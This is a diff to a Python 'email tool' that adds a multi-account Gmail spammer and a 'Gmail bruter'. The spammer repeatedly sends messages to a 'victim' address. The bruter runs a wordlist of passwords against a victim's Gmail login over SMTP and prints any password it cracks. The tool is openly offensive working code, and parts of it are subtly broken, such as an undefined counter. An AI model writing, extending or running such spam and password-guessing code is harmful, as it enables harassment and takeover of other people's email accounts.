@@ -5,10 +5,12 @@ from colorama import Fore, Back, Style
 import sys
 from tqdm import tqdm
 import pyfiglet
-import pyautogui
 
 out = pyfiglet.figlet_format("JET", font="doh")
-outstand = pyfiglet.figlet_format("Spammer", font="rectangles")
+outstand1 = pyfiglet.figlet_format("Gmail Spammer", font="rectangles")
+outstand2 = pyfiglet.figlet_format("Yahoo Spammer", font="rectangles")
+outstand3 = pyfiglet.figlet_format("Outlook Spammer", font="rectangles")
+outstand4 = pyfiglet.figlet_format("Gmail Bruter", font="rectangles")
 smtp_server = "smtp.gmail.com"
 port = 587
 
@@ -45,17 +47,19 @@ print("Jams email tool")
 print('''
 --Gmail tools--
 1)Gmail spammer
+2)Multi gmail spammer (Spam with multiple emails)
+3)Gmail bruter (BETA)
 --Yahoo tools--
-2)Yahoo spammer
+4)Yahoo spammer
 --Outlook tools--
-3)Outlook spammer
+5)Outlook spammer
 (More tools coming soon)
 ''')
 optionfirst = input("Enter option:")
 
 if optionfirst == '1':
     clear()
-    print(Fore.BLUE + outstand)
+    print(Fore.BLUE + outstand1)
     sender_email = input(Fore.RED + "Enter your email:") #email for you account
     password = input("Enter password:") #password for your account
     receiver_email = input("Enter victim:") #victims email
@@ -89,7 +93,67 @@ if optionfirst == '1':
 
 if optionfirst == '2':
     clear()
-    print(Fore.BLUE + outstand)
+    print(Fore.BLUE + outstand1)
+    sender_email = input(Fore.RED + "Enter your email:") #email for you account
+    password = input("Enter password:") #password for your account
+    sender_email2 = input(Fore.RED + "Enter your second email:") #email for you account
+    password2 = input("Enter second password:") #password for your account
+    receiver_email = input("Enter victim:") #victims email
+    message = input("Enter message:") #message
+    times = input("Enter ammount of times:") #how many times it sends the email
+    times1 = int(times) #changes the string to an int
+    context = ssl.create_default_context()
+
+    try:
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.ehlo()
+        server.starttls(context=context)
+        server.ehlo()
+        for times1 in range(times1): #this is the loop and loop counter
+            server.login(sender_email, password)
+            server.sendmail(sender_email, receiver_email, message)
+            print("Email sent Using: [" + sender_email + "]")
+            server.login(sender_email2, password2)
+            server.sendmail(sender_email2, receiver_email, message)
+            print("Email sent Using: [" + sender_email2 + "]")
+    except Exception as e: #prints the error
+        print("Error, sending Exception.. ")
+        time.sleep(1)
+        print(e)
+        time.sleep(10)
+        server.quit() #quits
+    finally:
+        print("")
+
+        print("Finsihed sending all: [" + times2 + "] emails!")
+        time.sleep(1)
+        server.quit() #quits after all emails have been sent
+
+
+if optionfirst == '3':
+    clear()
+    print(Fore.BLUE + outstand4)
+    user = input("Enter victims email:")
+    wordlist = input("Enter passlist:")
+    wordlist = open(wordlist, "r")
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.ehlo()
+    context = ssl.create_default_context()
+    server.starttls(context=context)
+    
+    for password in wordlist:
+        try:
+            server.login(user, password)
+            print("[+] Password cracked!")
+            print("[!] " + password)
+            time.sleep(100)
+            server.quit()
+        except smtplib.SMTPAuthenticationError:
+            print("[-] Password Incorrect: " + password)
+
+if optionfirst == '4':
+    clear()
+    print(Fore.BLUE + outstand2)
     sender_email = input(Fore.RED + "Enter your email:") #email for you account
     password = input("Enter password:") #password for your account
     receiver_email = input("Enter victim:") #victims email
@@ -121,9 +185,9 @@ if optionfirst == '2':
         time.sleep(1)
         server1.quit() #quits after all emails have been sent
 
-if optionfirst == '3':
+if optionfirst == '5':
     clear()
-    print(Fore.BLUE + outstand)
+    print(Fore.BLUE + outstand3)
     sender_email = input(Fore.RED + "Enter your email:") #email for you account
     password = input("Enter password:") #password for your account
     receiver_email = input("Enter victim:") #victims email
@@ -154,4 +218,3 @@ if optionfirst == '3':
         print("Finsihed sending all: [" + times2 + "] emails!")
         time.sleep(1)
         server2.quit() #quits after all emails have been sent
-
